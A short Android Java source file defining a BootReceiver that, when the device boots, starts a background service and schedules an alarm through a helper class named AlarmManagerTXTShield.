package com.elite;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent arg1) {
        context.startService(new Intent(context, IntentServiceClass.class));
        new AlarmManagerTXTShield().setAlarm(context);
    }
}
